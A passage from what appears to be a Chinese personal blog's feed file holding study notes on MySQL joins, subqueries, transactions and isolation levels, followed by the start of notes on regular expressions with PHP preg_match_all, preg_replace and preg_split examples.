class="hljs-keyword">UPDATE</span> <span class="hljs-keyword">CASCADE</span> <span class="hljs-keyword">ON</span> <span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">CASCADE</span>;<br></code></pre></td></tr></table></figure><h2 id="多表查询"><a href="#多表查询" class="headerlink" title="多表查询"></a>多表查询</h2><h3 id="多表关系"><a href="#多表关系" class="headerlink" title="多表关系"></a>多表关系</h3><p>概述：<br>项目开发中，在进行数据库表结构设计时，会根据业务需求及业务模块之间的关系，分析并设计表结构，由于业务之间相互关联，所以各个表结构之间也存在着各种联系，基本上分为三种：</p><ul><li>一对多(多对一)</li><li>多对多</li><li>一对一</li></ul><p><img src="/../image/%E4%B8%80%E5%AF%B9%E5%A4%9A.png"></p><p><img src="/../image/%E5%A4%9A%E5%AF%B9%E5%A4%9A.png"></p><p><img src="/../image/%E4%B8%80%E5%AF%B9%E4%B8%80.png"></p><h3 id="多表查询概述"><a href="#多表查询概述" class="headerlink" title="多表查询概述"></a>多表查询概述</h3><p>概述：指从多张表中查询数据</p><p>笛卡尔积：笛卡尔积是指在数学中，两个集合 A集合 和 B集合所有的组合情况。（在多表查询时，需要消除无效的笛卡尔积）</p><p>多表查询分类：</p><p>连接查询</p><p>​内连接：相当于查询A、B交集部分数据</p><p>​外连接：</p><p>​左外连接：查询左表所有数据，以及两张表交际部分数据</p><p>​右外连接：查询右表所有数据，以及两张表交集部分数据</p><p>​自连接：当前表与自身的连接查询，自连接必须使用表别名</p><p>子查询</p><h3 id="连接查询-内连接"><a href="#连接查询-内连接" class="headerlink" title="连接查询-内连接"></a>连接查询-内连接</h3><p>内连接查询语法：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">隐式内连接<br><span class="hljs-keyword">SELECT</span> 字段列表 <span class="hljs-keyword">FROM</span> 表<span class="hljs-number">1</span>,表<span class="hljs-number">2</span> <span class="hljs-keyword">WHERE</span> 条件 ...;<br><br>显式内连接<br><span class="hljs-keyword">SELECT</span> 字段列表 <span class="hljs-keyword">FROM</span> 表<span class="hljs-number">1</span> [<span class="hljs-keyword">INNER</span>] <span class="hljs-keyword">JOIN</span> 表<span class="hljs-number">2</span> <span class="hljs-keyword">ON</span> 连接条件 ...;<br></code></pre></td></tr></table></figure><p>注意：内连接查询的是两张表交集的部分</p><p><img src="/../image/%E4%BA%A4%E9%9B%86.png"></p><p>例子：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-comment">-- 查询员工姓名，及关联的部门的名称</span><br><span class="hljs-comment">-- 隐式</span><br><span class="hljs-keyword">select</span> e.name, d.name <span class="hljs-keyword">from</span> employee <span class="hljs-keyword">as</span> e, dept <span class="hljs-keyword">as</span> d <span class="hljs-keyword">where</span> e.dept = d.id;<br><span class="hljs-comment">-- 显式</span><br><span class="hljs-keyword">select</span> e.name, d.name <span class="hljs-keyword">from</span> employee <span class="hljs-keyword">as</span> e <span class="hljs-keyword">inner</span> <span class="hljs-keyword">join</span> dept <span class="hljs-keyword">as</span> d <span class="hljs-keyword">on</span> e.dept = d.id;<br></code></pre></td></tr></table></figure><h3 id="连接查询-外连接"><a href="#连接查询-外连接" class="headerlink" title="连接查询-外连接"></a>连接查询-外连接</h3><p>外连接查询语法：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">左外连接<br><span class="hljs-keyword">SELECT</span> 字段列表 <span class="hljs-keyword">FROM</span> 表<span class="hljs-number">1</span> <span class="hljs-keyword">LEFT</span> [<span class="hljs-keyword">OUTER</span>] <span class="hljs-keyword">JOIN</span> 表<span class="hljs-number">2</span> <span class="hljs-keyword">ON</span> 条件 ...;<br>相当于查询表1(左表)的所有数据 包含 表1和表2交集部分的数据<br><br>右外连接<br><span class="hljs-keyword">SELECT</span> 字段列表 <span class="hljs-keyword">FROM</span> 表<span class="hljs-number">1</span> <span class="hljs-keyword">RIGHT</span> [<span class="hljs-keyword">OUTER</span>] <span class="hljs-keyword">JOIN</span> 表<span class="hljs-number">2</span> <span class="hljs-keyword">ON</span> 条件 ...;<br>相当于查询表2(右表)的所有数据 包含 表1和表2交集部分的数据<br></code></pre></td></tr></table></figure><p><img src="/../image/%E4%BA%A4%E9%9B%86.png"></p><p>例子：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">-- 左<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">e</span>.*, d.name <span class="hljs-keyword">from</span> employee  <span class="hljs-built_in">e</span> <span class="hljs-keyword">left</span> <span class="hljs-keyword">outer</span> <span class="hljs-keyword">join</span> dept  d <span class="hljs-keyword">on</span> <span class="hljs-built_in">e</span>.dept = d.id;<br><span class="hljs-keyword">select</span> d.name, <span class="hljs-built_in">e</span>.* <span class="hljs-keyword">from</span> dept d <span class="hljs-keyword">left</span> <span class="hljs-keyword">outer</span> <span class="hljs-keyword">join</span> emp <span class="hljs-built_in">e</span> <span class="hljs-keyword">on</span> <span class="hljs-built_in">e</span>.dept = d.id;  -- 这条语句与下面的语句效果一样<br><br>-- 右<br><span class="hljs-keyword">select</span> d.name, <span class="hljs-built_in">e</span>.* <span class="hljs-keyword">from</span> employee  <span class="hljs-built_in">e</span> <span class="hljs-keyword">right</span> <span class="hljs-keyword">outer</span> <span class="hljs-keyword">join</span> dept d <span class="hljs-keyword">on</span> <span class="hljs-built_in">e</span>.dept = d.id;<br></code></pre></td></tr></table></figure><h3 id="连接查询-自连接"><a href="#连接查询-自连接" class="headerlink" title="连接查询-自连接"></a>连接查询-自连接</h3><p>自连接查询语法：</p><p>自连接查询，可以是内连接查询，也可以是外连接查询。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">SELECT</span> 字段列表 <span class="hljs-selector-tag">FROM</span> 表<span class="hljs-selector-tag">A</span> 别名<span class="hljs-selector-tag">A</span> JOIN 表<span class="hljs-selector-tag">A</span> 别名<span class="hljs-selector-tag">B</span> ON 条件 ...;<br></code></pre></td></tr></table></figure><p>注意：在自连接查询时必须取别名 </p><p>例子：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-comment">-- 查询员工及其所属领导的名字</span><br><span class="hljs-keyword">select</span> a.name, b.name <span class="hljs-keyword">from</span> employee a, employee b <span class="hljs-keyword">where</span> a.manager = b.id;<br><span class="hljs-comment">-- 没有领导的也查询出来</span><br><span class="hljs-keyword">select</span> a.name, b.name <span class="hljs-keyword">from</span> employee a <span class="hljs-keyword">left join</span> employee b <span class="hljs-keyword">on</span> a.manager = b.id;<br></code></pre></td></tr></table></figure><h3 id="联合查询-union-union-all"><a href="#联合查询-union-union-all" class="headerlink" title="联合查询-union,union all"></a>联合查询-union,union all</h3><p>对于union查询，就是把多次查询的结果合并起来，形成一个新的查询结果集。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">SELECT</span> 字段列表 <span class="hljs-selector-tag">FROM</span> 表<span class="hljs-selector-tag">A</span> ...<br>UNION <span class="hljs-selector-attr">[ALL]</span><br><span class="hljs-selector-tag">SELECT</span> 字段列表 <span class="hljs-selector-tag">FROM</span> 表<span class="hljs-selector-tag">B</span> ...;<br></code></pre></td></tr></table></figure><p><strong>注意事项</strong></p><ul><li>union all 会将全部的数据直接合并在一起，union 会对合并之后的数据去重</li><li><strong>对于联合查询的多张表的列数必须保持一致，字段类型也需要保持一致</strong></li></ul><h3 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h3><p>概念：SQL语句中嵌套SELECT语句，称谓<strong>嵌套查询</strong>，又称<strong>子查询</strong>。</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> t1 <span class="hljs-keyword">WHERE</span> column1 = (<span class="hljs-keyword">SELECT</span> column1 <span class="hljs-keyword">FROM</span> t2);<br></code></pre></td></tr></table></figure><p>子查询外部的语句可以是INSERT&#x2F;UPDATE&#x2F;DELETE&#x2F;SELECT的任何一个。</p><p>根据子查询结果不同，分为：</p><ul><li>标量子查询（子查询结果为单个值）</li><li>列子查询（子查询结果为一列）</li><li>行子查询（子查询结果为一行）</li><li>表子查询（子查询结果为多行多列）</li></ul><p>根据子查询位置，分为：WHERE之后、FROM之后、SELECT之后。</p><h4 id="标量子查询"><a href="#标量子查询" class="headerlink" title="标量子查询"></a>标量子查询</h4><p>子查询返回的结果是单个值（数字、字符串、日期等），最简单的形式，这种子查询成为标量子查询。</p><p>常用的操作符：&#x3D;  &lt;&gt;  &gt;  &gt;&#x3D;  &lt;  &lt;&#x3D;</p><p>例子：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-comment">-- 查询销售部所有员工</span><br><span class="hljs-keyword">select</span> id <span class="hljs-keyword">from</span> dept <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;销售部&#x27;</span>;<br><span class="hljs-comment">-- 根据销售部部门ID，查询员工信息</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> employee <span class="hljs-keyword">where</span> dept = <span class="hljs-number">4</span>;<br><span class="hljs-comment">-- 合并（子查询）</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> employee <span class="hljs-keyword">where</span> dept = (<span class="hljs-keyword">select</span> id <span class="hljs-keyword">from</span> dept <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;销售部&#x27;</span>);<br><br><span class="hljs-comment">-- 查询xxx入职之后的员工信息</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> employee <span class="hljs-keyword">where</span> entrydate &gt; (<span class="hljs-keyword">select</span> entrydate <span class="hljs-keyword">from</span> employee <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;xxx&#x27;</span>);<br></code></pre></td></tr></table></figure><h4 id="列子查询"><a href="#列子查询" class="headerlink" title="列子查询"></a>列子查询</h4><p>子查询返回的结果是一列（可以是多行），这种子查询称为列子查询。</p><p><img src="/../image/%E5%88%97%E5%AD%90%E6%9F%A5%E8%AF%A2%E6%93%8D%E4%BD%9C%E7%AC%A6.png"></p><p>例子：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-comment">-- 查询销售部和市场部的所有员工信息</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> employee <span class="hljs-keyword">where</span> dept <span class="hljs-keyword">in</span> (<span class="hljs-keyword">select</span> id <span class="hljs-keyword">from</span> dept <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;销售部&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;市场部&#x27;</span>);<br><br><span class="hljs-comment">-- 查询比财务部所有人工资都高的员工信息</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> employee <span class="hljs-keyword">where</span> salary &gt; <span class="hljs-keyword">all</span>(<span class="hljs-keyword">select</span> salary <span class="hljs-keyword">from</span> employee <span class="hljs-keyword">where</span> dept = (<span class="hljs-keyword">select</span> id <span class="hljs-keyword">from</span> dept <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;财务部&#x27;</span>));<br><br><span class="hljs-comment">-- 查询比研发部任意一人工资高的员工信息</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> employee <span class="hljs-keyword">where</span> salary &gt; <span class="hljs-keyword">any</span> (<span class="hljs-keyword">select</span> salary <span class="hljs-keyword">from</span> employee <span class="hljs-keyword">where</span> dept = (<span class="hljs-keyword">select</span> id <span class="hljs-keyword">from</span> dept <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;研发部&#x27;</span>));<br></code></pre></td></tr></table></figure><h4 id="行子查询"><a href="#行子查询" class="headerlink" title="行子查询"></a>行子查询</h4><p>子查询返回的结果是一行（可以是多列），这种子查询称为行子查询。</p><p>常用的操作符：&#x3D;、&lt;&gt;、IN、NOT、IN</p><p>例子：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-comment">-- 查询与xxx的薪资及直属领导相同的员工信息</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> employee <span class="hljs-keyword">where</span> (salary, manager) = (<span class="hljs-number">12500</span>, <span class="hljs-number">1</span>);<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> employee <span class="hljs-keyword">where</span> (salary, manager) = (<span class="hljs-keyword">select</span> salary, manager <span class="hljs-keyword">from</span> employee <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;xxx&#x27;</span>);<br></code></pre></td></tr></table></figure><h4 id="表子查询"><a href="#表子查询" class="headerlink" title="表子查询"></a>表子查询</h4><p>子查询返回的结果是多行多列，这种子查询称为表子查询。</p><p>常用的操作符：IN</p><p>例子：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">-- 查询与xxx1，xxx2的职位和薪资相同的员工<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> employee <span class="hljs-keyword">where</span> (job, salary) <span class="hljs-keyword">in</span> (<span class="hljs-keyword">select</span> job, salary <span class="hljs-keyword">from</span> employee <span class="hljs-keyword">where</span> name = <span class="hljs-string">&#x27;xxx1&#x27;</span> <span class="hljs-keyword">or</span> name = <span class="hljs-string">&#x27;xxx2&#x27;</span>);<br>-- 查询入职日期是2006-01-01之后的员工，及其部门信息<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">e</span>.*, d.* <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> employee <span class="hljs-keyword">where</span> entrydate &gt; <span class="hljs-string">&#x27;2006-01-01&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-built_in">e</span> <span class="hljs-keyword">left</span> <span class="hljs-keyword">join</span> dept <span class="hljs-keyword">as</span> d <span class="hljs-keyword">on</span> <span class="hljs-built_in">e</span>.dept = d.id;<br></code></pre></td></tr></table></figure><h2 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h2><p>事务是一组操作的集合，事务会把所有操作作为一个整体一起向系统提交或撤销操作请求，即这些操作要么同时成功，要么同时失败。</p><p>基本操作：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-comment">-- 1. 查询张三账户余额</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> account <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;张三&#x27;</span>;<br><span class="hljs-comment">-- 2. 将张三账户余额-1000</span><br><span class="hljs-keyword">update</span> account <span class="hljs-keyword">set</span> <span class="hljs-type">money</span> = <span class="hljs-type">money</span> - <span class="hljs-number">1000</span> <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;张三&#x27;</span>;<br><span class="hljs-comment">-- 此语句出错后张三钱减少但是李四钱没有增加</span><br>模拟<span class="hljs-keyword">sql</span>语句错误<br><span class="hljs-comment">-- 3. 将李四账户余额+1000</span><br><span class="hljs-keyword">update</span> account <span class="hljs-keyword">set</span> <span class="hljs-type">money</span> = <span class="hljs-type">money</span> + <span class="hljs-number">1000</span> <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;李四&#x27;</span>;<br><br><span class="hljs-comment">-- 查看事务提交方式</span><br><span class="hljs-keyword">SELECT</span> @@AUTOCOMMIT;<br><span class="hljs-comment">-- 设置事务提交方式，1为自动提交，0为手动提交，该设置只对当前会话有效</span><br><span class="hljs-keyword">SET</span> @@AUTOCOMMIT = <span class="hljs-number">0</span>;<br><span class="hljs-comment">-- 提交事务</span><br><span class="hljs-keyword">COMMIT</span>;<br><span class="hljs-comment">-- 回滚事务</span><br><span class="hljs-keyword">ROLLBACK</span>;<br><br><span class="hljs-comment">-- 设置手动提交后上面代码改为：</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> account <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;张三&#x27;</span>;<br><span class="hljs-keyword">update</span> account <span class="hljs-keyword">set</span> <span class="hljs-type">money</span> = <span class="hljs-type">money</span> - <span class="hljs-number">1000</span> <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;张三&#x27;</span>;<br><span class="hljs-keyword">update</span> account <span class="hljs-keyword">set</span> <span class="hljs-type">money</span> = <span class="hljs-type">money</span> + <span class="hljs-number">1000</span> <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;李四&#x27;</span>;<br><span class="hljs-keyword">commit</span>;<br></code></pre></td></tr></table></figure><p>操作方式二：</p><p>开启事务：<br><code>START TRANSACTION 或 BEGIN TRANSACTION;</code><br>提交事务：<br><code>COMMIT;</code><br>回滚事务：<br><code>ROLLBACK;</code></p><p>操作实例：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">start</span> <span class="hljs-keyword">transaction</span>;<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> account <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;张三&#x27;</span>;<br><span class="hljs-keyword">update</span> account <span class="hljs-keyword">set</span> <span class="hljs-type">money</span> = <span class="hljs-type">money</span> - <span class="hljs-number">1000</span> <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;张三&#x27;</span>;<br><span class="hljs-keyword">update</span> account <span class="hljs-keyword">set</span> <span class="hljs-type">money</span> = <span class="hljs-type">money</span> + <span class="hljs-number">1000</span> <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;李四&#x27;</span>;<br><span class="hljs-keyword">commit</span>;<br></code></pre></td></tr></table></figure><h3 id="四大特性ACID"><a href="#四大特性ACID" class="headerlink" title="四大特性ACID"></a>四大特性ACID</h3><ul><li>原子性(Atomicity)：事务是不可分割的最小操作但愿，要么全部成功，要么全部失败</li><li>一致性(Consistency)：事务完成时，必须使所有数据都保持一致状态</li><li>隔离性(Isolation)：数据库系统提供的隔离机制，保证事务在不受外部并发操作影响的独立环境下运行</li><li>持久性(Durability)：事务一旦提交或回滚，它对数据库中的数据的改变就是永久的</li></ul><h3 id="并发事务"><a href="#并发事务" class="headerlink" title="并发事务"></a>并发事务</h3><table><thead><tr><th>问题</th><th>描述</th></tr></thead><tbody><tr><td>脏读</td><td>一个事务读到另一个事务还没提交的数据</td></tr><tr><td>不可重复读</td><td>一个事务先后读取同一条记录，但两次读取的数据不同</td></tr><tr><td>幻读</td><td>一个事务按照条件查询数据时，没有对应的数据行，但是再插入数据时，又发现这行数据已经存在</td></tr></tbody></table><blockquote><p>这三个问题的详细演示：<a href="https://www.bilibili.com/video/BV1Kr4y1i7ru?p=55cd">https://www.bilibili.com/video/BV1Kr4y1i7ru?p=55cd</a></p></blockquote><p>并发事务隔离级别：</p><table><thead><tr><th>隔离级别</th><th>脏读</th><th>不可重复读</th><th>幻读</th></tr></thead><tbody><tr><td>Read uncommitted</td><td>√</td><td>√</td><td>√</td></tr><tr><td>Read committed</td><td>×</td><td>√</td><td>√</td></tr><tr><td>Repeatable Read(默认)</td><td>×</td><td>×</td><td>√</td></tr><tr><td>Serializable</td><td>×</td><td>×</td><td>×</td></tr></tbody></table><ul><li>√表示在当前隔离级别下该问题会出现</li><li>Serializable 性能最低；Read uncommitted 性能最高，数据安全性最差</li></ul><p>查看事务隔离级别：<br><code>SELECT @@TRANSACTION_ISOLATION;</code><br>设置事务隔离级别：<br><code>SET [ SESSION | GLOBAL ] TRANSACTION ISOLATION LEVEL &#123;READ UNCOMMITTED | READ COMMITTED | REPEATABLE READ | SERIALIZABLE &#125;;</code><br>SESSION 是会话级别，表示只针对当前会话有效，GLOBAL 表示对所有会话有效</p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正则表达式笔记</title>
      <link href="/2024/12/28/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/12/28/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="正则表达式简介"><a href="#正则表达式简介" class="headerlink" title="正则表达式简介"></a>正则表达式简介</h1><p><strong>正则表达式</strong>（Regular Expression，简称regex或regexp）是一种用于描述和匹配字符串模式的工具，广泛应用于文本处理中，包括搜索、替换和验证字符串。</p><h3 id="主要用途"><a href="#主要用途" class="headerlink" title="主要用途"></a>主要用途</h3><p>正则表达式的主要用途包括：</p><ol><li>‌<strong>文本搜索</strong>‌：在大文本中查找特定的子字符串。</li><li>‌<strong>文本替换</strong>‌：将匹配的子字符串替换为其他字符串。</li><li>‌<strong>字符串验证</strong>‌：验证输入是否符合特定格式（如邮箱地址、电话号码、邮政编码等）。</li><li>‌<strong>数据提取</strong>‌：从文本中提取符合特定模式的数据‌</li></ol><h1 id="正则表达式的学习"><a href="#正则表达式的学习" class="headerlink" title="正则表达式的学习"></a>正则表达式的学习</h1><h2 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h2><p>标记也称为修饰符，正则表达式的标记用于指定额外的匹配策略。</p><p>标记不写在正则表达式里，标记位于表达式之外</p><p>常用的修饰符：</p><p><img src="/../image/%E4%BF%AE%E9%A5%B0%E7%AC%A6.png"></p><h2 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h2><h3 id="常用的字符簇"><a href="#常用的字符簇" class="headerlink" title="常用的字符簇"></a>常用的字符簇</h3><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><br>匹配范围<br>具体字符<span class="hljs-function"><span class="hljs-params">(字面值)</span>--&gt;</span> 比如说找a,b,hi<br>字符边界<span class="hljs-function"><span class="hljs-params">(下面加粗)</span>--&gt;</span> 从哪开始到哪结束<br>字符集合[ace],[<span class="hljs-number">0123456789</span>]--&gt; 里面任意条件符合的找出来<br>字符补集[^qxz]--&gt; 里面任意条件符合的不要<br>字符范围[a-z0-<span class="hljs-number">9</span>]--&gt; 注意:必须是连续的，不能写a-Z<br>字符簇(系统定义好的常用集合)<br></code></pre></td></tr></table></figure><p><img src="/../image/%E5%B8%B8%E7%94%A8%E5%AD%97%E7%AC%A6%E7%B0%87.png"></p><h3 id="字符边界"><a href="#字符边界" class="headerlink" title="字符边界"></a>字符边界</h3><p><img src="/../image/%E5%AD%97%E7%AC%A6%E8%BE%B9%E7%95%8C.png"></p><p>比如^a会去匹配行首的a</p><p>a$会去匹配行尾的a</p><h3 id="限定符"><a href="#限定符" class="headerlink" title="限定符"></a>限定符</h3><p>用来限定匹配几个</p><p><img src="/../image/%E6%89%BE%E5%87%A0%E4%B8%AA.png"></p><h3 id="匹配多个字符"><a href="#匹配多个字符" class="headerlink" title="匹配多个字符"></a>匹配多个字符</h3><p>()</p><p>例如(ab)+,表示匹配ab出现1次或者多次</p><h3 id="或运算符"><a href="#或运算符" class="headerlink" title="或运算符"></a>或运算符</h3><p>|</p><p>比如：(cat|dog)b，表示匹配catb或者dogb</p><p>如果是：cat|dogb，表示匹配cat或者dogb</p><h3 id="集合和补集"><a href="#集合和补集" class="headerlink" title="集合和补集"></a>集合和补集</h3><p>集合：[]</p><p>比如[abcd]表示能匹配的字符是a,b,c,d</p><p>补集[^abcd]表示能匹配的字符是除了a,b,c,d的其他所有字符</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="/../image/%E6%9C%80%E7%BB%88%E6%80%BB%E7%BB%93.png"></p><h2 id="PHP中关于正则表达式的函数"><a href="#PHP中关于正则表达式的函数" class="headerlink" title="PHP中关于正则表达式的函数"></a>PHP中关于正则表达式的函数</h2><p>preg_match_all()通过一个正则表达式匹配字符串</p><p>例如：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><br>$str = &#x27;hello o2o <span class="hljs-number">2b9</span> <span class="hljs-number">250</span>&#x27;;<br>$patt = &#x27;/\b[a-zA-Z]+\b|\b[<span class="hljs-number">0</span>-<span class="hljs-number">9</span>]+\b/&#x27;; // 或者的用法<br>preg_match_all($patt,$str,$res);<br></code></pre></td></tr></table></figure><p>preg_replace()执行一个正则表达式的搜索和替换</p><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">//把所有空格替换成一个空格</span><br><span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;tommorw         is           another         day&quot;</span>;<br><span class="hljs-variable">$patt</span> = <span class="hljs-string">&quot;/\s&#123;1,&#125;/&quot;</span>; 表示至少匹配一个空格<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$patt</span>,<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-variable">$str</span>);<br></code></pre></td></tr></table></figure><p>preg_split()通过一个正则表达式分割字符串</p><p>例如：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><br>$str = <span class="hljs-string">&#x27;tommorw is another day,o2o ,you dont bird me idont bird you&#x27;</span><span class="hljs-comment">;</span><br>$patt = <span class="hljs-string">&#x27;/\W&#123;1,&#125;/&#x27;</span><span class="hljs-comment">;</span><br>print_r(preg_split($patt,$str))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h2 id="贪婪模式和非贪婪模式"><a href="#贪婪模式和非贪婪模式" class="headerlink" title="贪婪模式和非贪婪模式"></a>贪婪模式和非贪婪模式</h2><p>贪婪模式：表示尽量往后匹配</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 贪婪模式 尽量往后匹配</span><br><span class="hljs-variable">$str</span> = <span class="hljs-string">&#x27;ksda good goooood good kl s ja dfs dk &#x27;</span>;<br><span class="hljs-variable">$patt</span> = <span class="hljs-string">&#x27;/g.+d/&#x27;</span>; <span class="hljs-comment">// god  .点  任意字符，不含换行</span><br><span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-variable">$patt</span>, <span 